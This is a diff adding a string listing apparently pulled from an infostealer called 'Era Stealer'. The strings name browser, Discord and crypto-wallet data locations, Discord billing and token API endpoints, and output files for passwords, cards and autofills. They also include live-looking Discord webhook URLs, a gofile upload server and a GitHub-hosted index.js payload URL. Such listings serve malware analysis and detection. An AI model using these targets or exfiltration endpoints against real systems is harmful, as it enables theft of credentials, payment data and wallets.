@@ -1,0 +1,198 @@
+%WEBHOOK%
+./
+<:activedev:1242155305018589276>
+<:balance:1240683920672952410>
+<:billing:1240636353364889700>
+<:blackstar:1240640910392430602>
+<:bravery:1240683741614047303>
+<:brillance:1240683831984390284>
+<:bug1:1240682888471773205>
+<:bug2:1240682926493138975>
+<:card:1240685133128798258>
+<:crown:1240635323671773258>
+<:diamond:1240636957843783700>
+<:drag:1240636089258086461>
+<:early:1240683094659563530>
+<:earlydev:1240683221495189595>
+<:hypevent:1240682473742930002>
+<:lv1:1240666056519843881>
+<:lv12:1240666220387110942>
+<:lv15:1240666247771979807>
+<:lv18:1240666288569843762>
+<:lv2:1240666088568787005>
+<:lv24:1240666318944866385>
+<:lv3:1240666118633291877>
+<:lv6:1240666144298242118>
+<:lv9:1240666174438768661>
+<:moderator:1240684039707558018>
+<:nitro:1240664616716075078>
+<:partner:1240682204372144178>
+<:password:1240676883583078441>
+<:paypal:1240684761639551077>
+<:staff:1240682088169210056>
+<:trident:1240636497250484275>
+<:world:1240635322170343444>
+================Era Stealer================\nName: 
+================Era Stealer================\nURL: 
+@primno/dpapi
+Certified Moderator
+Era Stealer
+Era stealer & https://t.me/era_stealer
+Guest Profile
+Local Storage\\leveldb
+Network\\Cookies
+Network\\LxnyCookies
+Profile_1
+Profile_2
+Profile_3
+Profile_4
+Profile_5
+Wallets
+Wallets\\Cookies
+\\..
+\\..\\Autofills.txt
+\\..\\Cards.txt
+\\..\\Passwords.txt
+\\BraveSoftware\\Brave-Browser\\User Data\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Default\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\
+\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\
+\\Browser.zip
+\\Discord
+\\Google\\Chrome\\User Data\\
+\\Google\\Chrome\\User Data\\Default\\
+\\Google\\Chrome\\User Data\\Default\\Network\\
+\\Google\\Chrome\\User Data\\Guest Profile\\
+\\Google\\Chrome\\User Data\\Guest Profile\\Network\\
+\\Google\\Chrome\\User Data\\Profile 1\\
+\\Google\\Chrome\\User Data\\Profile 1\\Network\\
+\\Google\\Chrome\\User Data\\Profile 2\\
+\\Google\\Chrome\\User Data\\Profile 2\\Network\\
+\\Google\\Chrome\\User Data\\Profile 3\\
+\\Google\\Chrome\\User Data\\Profile 3\\Network\\
+\\Google\\Chrome\\User Data\\Profile 4\\
+\\Google\\Chrome\\User Data\\Profile 4\\Network\\
+\\Google\\Chrome\\User Data\\Profile 5\\
+\\Google\\Chrome\\User Data\\Profile 5\\Network\\
+\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg
+\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno
+\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp
+\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb
+\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih
+\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca
+\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa
+\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac
+\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk
+\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne
+\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci
+\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb
+\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap
+\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm
+\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj
+\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk
+\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph
+\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm
+\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci
+\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg
+\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb
+\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp
+\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh
+\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno
+\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi
+\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec
+\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib
+\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj
+\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf
+\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad
+\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln
+\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec
+\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid
+\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma
+\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd
+\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk
+\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj
+\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn
+\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo
+\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli
+\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge
+\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn
+\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj
+\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn
+\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig
+\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm
+\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd
+\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl
+\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc
+\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil
+\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk
+\\Local State
+\\Local\\
+\\Microsoft\\Edge\\User Data\\
+\\Microsoft\\Edge\\User Data\\Default\\
+\\Microsoft\\Edge\\User Data\\Default\\Network\\
+\\Microsoft\\Edge\\User Data\\Guest Profile\\
+\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\
+\\Microsoft\\Edge\\User Data\\Profile 1\\
+\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\
+\\Microsoft\\Edge\\User Data\\Profile 2\\
+\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\
+\\Microsoft\\Edge\\User Data\\Profile 3\\
+\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\
+\\Microsoft\\Edge\\User Data\\Profile 4\\
+\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\
+\\Microsoft\\Edge\\User Data\\Profile 5\\
+\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\
+\\Network
+\\Opera Software\\Opera GX Stable\\
+\\Opera Software\\Opera Neon\\User Data\\
+\\Opera Software\\Opera Neon\\User Data\\Default\\
+\\Opera Software\\Opera Stable\\
+\\Roaming\\
+\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc
+\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai
+\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio
+\\Yandex\\YandexBrowser\\User Data\\
+\\Yandex\\YandexBrowser\\User Data\\Default\\
+\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\
+\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 1\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 2\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 3\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 4\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 5\\
+\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\
+\\discord\\
+\\discordcanary\\
+\\discorddevelopment\\
+\\discordptb\\
+\\index.js
+\\lightcord\\
+application/json
+erastealer
+https://api.gofile.io/servers
+https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&
+https://discord.com/api/v6/users/@me
+https://discord.com/api/v9/users/@me
+https://discord.com/api/v9/users/@me/billing/payment-sources
+https://discord.com/api/v9/users/@me/guilds?with_counts=true
+https://discord.com/api/v9/users/@me/relationships
+https://discord.com/api/webhooks/1333842800093040701/SKKymfPjmJzlcjSm5ZdPMqPz6AXuf-b-Umahtr7-vneLpgkrQk4UZ1CVpdHL5C2RFKvv
+https://discord.com/api/webhooks/1333846223496548413/266IyNN-0afAIPicclJ8b4YpZfybmyOcW4iM5nE3UrDMBwRAj8SZ91TJWJud8gSDp7-J
+https://raw.githubusercontent.com/xSalca/Viral/main/index.js
+https://www.myexternalip.com/raw
+opera.exe
